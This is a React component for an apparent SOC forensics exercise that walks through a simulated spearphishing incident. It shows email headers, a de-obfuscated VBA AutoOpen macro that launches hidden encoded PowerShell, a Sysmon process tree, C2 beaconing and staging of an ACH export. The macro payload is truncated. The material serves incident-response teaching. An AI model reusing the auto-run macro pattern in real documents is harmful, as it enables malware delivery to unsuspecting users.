import React, { useState } from 'react';
import { Mail, FileCode, Network, FolderLock, ShieldAlert, Terminal, AlertTriangle, CheckCircle2 } from 'lucide-react';

export default function AttackStageAnalysis() {
  const [activeTab, setActiveTab] = useState('phishing');

  return (
    <div className="space-y-6">
      <div className="soc-card p-6 space-y-4">
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-4 border-b border-slate-800">
          <div>
            <div className="flex items-center gap-2">
              <ShieldAlert className="w-5 h-5 text-amber-400" />
              <h3 className="text-base font-bold text-slate-100 uppercase tracking-wide">
                Problem 11 Forensic Artifact & Evidence Inspector
              </h3>
            </div>
            <p className="text-xs text-slate-400 mt-1">
              Detailed technical breakdown of email headers, process execution trees, C2 beaconing, and staged file shares.
            </p>
          </div>
        </div>

        {/* Tab Buttons */}
        <div className="flex flex-wrap gap-2">
          <button
            onClick={() => setActiveTab('phishing')}
            className={`px-4 py-2 rounded-lg text-xs font-semibold flex items-center gap-2 transition-all cursor-pointer ${
              activeTab === 'phishing'
                ? 'bg-amber-950 text-amber-300 border border-amber-500/60'
                : 'bg-slate-950 text-slate-400 border border-slate-800 hover:text-slate-200'
            }`}
          >
            <Mail className="w-4 h-4 text-rose-400" /> 1. Spearphishing Email & Macro
          </button>
          <button
            onClick={() => setActiveTab('process')}
            className={`px-4 py-2 rounded-lg text-xs font-semibold flex items-center gap-2 transition-all cursor-pointer ${
              activeTab === 'process'
                ? 'bg-amber-950 text-amber-300 border border-amber-500/60'
                : 'bg-slate-950 text-slate-400 border border-slate-800 hover:text-slate-200'
            }`}
          >
            <Terminal className="w-4 h-4 text-purple-400" /> 2. Process Execution Tree
          </button>
          <button
            onClick={() => setActiveTab('network')}
            className={`px-4 py-2 rounded-lg text-xs font-semibold flex items-center gap-2 transition-all cursor-pointer ${
              activeTab === 'network'
                ? 'bg-amber-950 text-amber-300 border border-amber-500/60'
                : 'bg-slate-950 text-slate-400 border border-slate-800 hover:text-slate-200'
            }`}
          >
            <Network className="w-4 h-4 text-cyan-400" /> 3. Outbound C2 Network Beaconing
          </button>
          <button
            onClick={() => setActiveTab('share')}
            className={`px-4 py-2 rounded-lg text-xs font-semibold flex items-center gap-2 transition-all cursor-pointer ${
              activeTab === 'share'
                ? 'bg-amber-950 text-amber-300 border border-amber-500/60'
                : 'bg-slate-950 text-slate-400 border border-slate-800 hover:text-slate-200'
            }`}
          >
            <FolderLock className="w-4 h-4 text-emerald-400" /> 4. Financial Share Staging
          </button>
        </div>
      </div>

      {/* Tab 1: Spearphishing & Macro */}
      {activeTab === 'phishing' && (
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          <div className="soc-card p-6 space-y-4">
            <div className="flex items-center gap-2 border-b border-slate-800 pb-3">
              <Mail className="w-5 h-5 text-rose-400" />
              <h4 className="font-bold text-sm text-slate-100 uppercase">Spearphishing Email Headers</h4>
            </div>

            <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 font-mono text-xs space-y-2 text-slate-300">
              <div><strong className="text-amber-400">Return-Path:</strong> &lt;billing@vendor-invoices-q3.com&gt;</div>
              <div><strong className="text-amber-400">Delivered-To:</strong> ap-admin@finance.example.org</div>
              <div><strong className="text-amber-400">Received-From:</strong> 198.51.100.42 (mail-relay.vendor-invoices-q3.com)</div>
              <div><strong className="text-amber-400">Date:</strong> Wed, 16 Sep 2026 08:23:41 -0400</div>
              <div><strong className="text-amber-400">Subject:</strong> URGENT: Q3 Vendor Invoice #INV-2026-8891.docm</div>
              <div><strong className="text-amber-400">Attachment:</strong> Invoice_Oct2026.docm (Size: 142 KB)</div>
              <div><strong className="text-amber-400">Attachment SHA256:</strong> 7f8a9b2c3d4e5f6a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a</div>
            </div>

            <p className="text-xs text-slate-400 leading-relaxed">
              The attacker impersonated a standard credit union vendor, using urgent financial language to coax the Accounts Payable employee into enabling Word macros.
            </p>
          </div>

          <div className="soc-card p-6 space-y-4">
            <div className="flex items-center gap-2 border-b border-slate-800 pb-3">
              <FileCode className="w-5 h-5 text-purple-400" />
              <h4 className="font-bold text-sm text-slate-100 uppercase">VBA Macro Analysis (De-obfuscated)</h4>
            </div>

            <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 font-mono text-[11px] text-purple-300 space-y-1.5 leading-relaxed overflow-x-auto">
              <div className="text-slate-500">' Subroutine executed automatically upon Word document open</div>
              <div><strong className="text-rose-400">Sub</strong> AutoOpen()</div>
              <div className="pl-4">Dim cmd <strong className="text-rose-400">As String</strong></div>
              <div className="pl-4">cmd = <span className="text-emerald-300">"powershell.exe -nop -w hidden -enc aWYoKCdodHRwc..."</span></div>
              <div className="pl-4">Set shell = CreateObject(<span className="text-emerald-300">"WScript.Shell"</span>)</div>
              <div className="pl-4">shell.Run cmd, 0, <strong className="text-rose-400">False</strong></div>
              <div><strong className="text-rose-400">End Sub</strong></div>
            </div>

            <div className="bg-rose-950/30 p-3 rounded-lg border border-rose-500/40 text-xs text-rose-200">
              <strong>Security Finding:</strong> Microsoft Word spawned PowerShell in hidden window mode without user prompting. Blocked by GPO macro policies.
            </div>
          </div>
        </div>
      )}

      {/* Tab 2: Process Execution Tree */}
      {activeTab === 'process' && (
        <div className="soc-card p-6 space-y-4">
          <div className="flex items-center justify-between border-b border-slate-800 pb-3">
            <div className="flex items-center gap-2">
              <Terminal className="w-5 h-5 text-purple-400" />
              <h4 className="font-bold text-sm text-slate-100 uppercase">Sysmon Event ID 1 — Process Execution Tree</h4>
            </div>
            <span className="text-xs font-mono text-amber-400">Host: AP-FIN-04 (192.168.10.45)</span>
          </div>

          {/* Visual Tree */}
          <div className="bg-slate-950 p-6 rounded-xl border border-slate-800 space-y-4 font-mono text-xs">
            {/* Parent 1 */}
            <div className="p-3 bg-slate-900 border border-slate-800 rounded-lg space-y-1">
              <div className="flex items-center justify-between">
                <span className="text-slate-400 font-bold">1. SYSTEM SHELL PROCESS</span>
                <span className="text-[10px] bg-slate-800 px-2 py-0.5 rounded text-slate-300">PID 3102</span>
              </div>
              <div className="text-cyan-300 font-bold">C:\Windows\explorer.exe</div>
            </div>

            <div className="pl-6 border-l-2 border-slate-700 space-y-4">
              {/* Parent 2 */}
              <div className="p-3 bg-slate-900 border border-slate-800 rounded-lg space-y-1">
                <div className="flex items-center justify-between">
                  <span className="text-slate-400 font-bold">2. USER WORD PROCESS</span>
                  <span className="text-[10px] bg-slate-800 px-2 py-0.5 rounded text-slate-300">PID 4812</span>
                </div>
                <div className="text-cyan-300 font-bold">C:\Program Files\Microsoft Office\Office16\WINWORD.EXE</div>
                <div className="text-[11px] text-slate-400 font-sans">
                  Opened file: C:\Users\ap-admin\Downloads\Invoice_Oct2026.docm
                </div>
              </div>

              <div className="pl-6 border-l-2 border-rose-500/80 space-y-4">
                {/* Malicious Child */}
                <div className="p-4 bg-rose-950/40 border border-rose-500/60 rounded-lg space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="text-rose-400 font-bold flex items-center gap-1.5">
                      <AlertTriangle className="w-4 h-4 text-rose-400" /> 3. ANOMALOUS CHILD PROCESS (FLAGGED BY EDR)
                    </span>
                    <span className="text-[10px] bg-rose-950 px-2 py-0.5 rounded text-rose-300 border border-rose-500/50">
                      PID 5920
                    </span>
                  </div>
                  <div className="text-rose-200 font-bold">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</div>
                  <div className="p-2.5 bg-slate-950 rounded border border-rose-900/60 text-slate-300 text-[11px] font-mono leading-relaxed">
                    powershell.exe -nop -w hidden -enc aWYoKCdodHRwc...
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Tab 3: Outbound C2 Network Beaconing */}
      {activeTab === 'network' && (
        <div className="soc-card p-6 space-y-4">
          <div className="flex items-center justify-between border-b border-slate-800 pb-3">
            <div className="flex items-center gap-2">
              <Network className="w-5 h-5 text-cyan-400" />
              <h4 className="font-bold text-sm text-slate-100 uppercase">Sysmon Event ID 3 — C2 Network Socket Connections</h4>
            </div>
            <span className="text-xs font-mono text-cyan-400">Target C2: 198.51.100.42:443</span>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 space-y-2 text-xs">
              <div className="text-cyan-400 font-bold uppercase font-mono">Connection Telemetry</div>
              <div><strong className="text-slate-400">Source Host:</strong> AP-FIN-04 (192.168.10.45)</div>
              <div><strong className="text-slate-400">Source Port:</strong> 49812</div>
              <div><strong className="text-slate-400">Destination C2:</strong> 198.51.100.42:443 (HTTPS)</div>
              <div><strong className="text-slate-400">Initiating Process:</strong> powershell.exe (PID 5920)</div>
              <div><strong className="text-slate-400">Beaconing Interval:</strong> ~60s jittered</div>
            </div>

            <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 space-y-2 text-xs">
              <div className="text-amber-400 font-bold uppercase font-mono">SOC Detection & Egress Filtering</div>
              <p className="text-slate-300 leading-relaxed font-sans">
                Outbound connection used TLS 1.3 encryption over standard Port 443 to blend with legitimate HTTPS traffic. Firewall domain filtering and SSL inspection identified unrated destination IP 198.51.100.42.
              </p>
            </div>
          </div>
        </div>
      )}

      {/* Tab 4: Financial Share Staging */}
      {activeTab === 'share' && (
        <div className="soc-card p-6 space-y-4">
          <div className="flex items-center justify-between border-b border-slate-800 pb-3">
            <div className="flex items-center gap-2">
              <FolderLock className="w-5 h-5 text-emerald-400" />
              <h4 className="font-bold text-sm text-slate-100 uppercase">Windows Security Event 5140 — SMB Share Access</h4>
            </div>
            <span className="text-xs font-mono text-emerald-400">Target Share: \\FIN-DATA-01\MemberOperations</span>
          </div>

          <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 font-mono text-xs space-y-2 text-slate-300">
            <div><strong className="text-amber-400">Target Share Path:</strong> \\FIN-DATA-01\MemberOperations</div>
            <div><strong className="text-amber-400">User Context:</strong> AP-DOMAIN\ap-admin</div>
            <div><strong className="text-amber-400">Accessed File:</strong> ACH_Batch_Export_092026.csv</div>
            <div><strong className="text-amber-400">Staged Local File Path:</strong> C:\Users\ap-admin\AppData\Local\Temp\~tmp772.dat</div>
            <div><strong className="text-amber-400">Staged Archive Size:</strong> 4.2 MB</div>
          </div>
        </div>
      )}
    </div>
  );
}
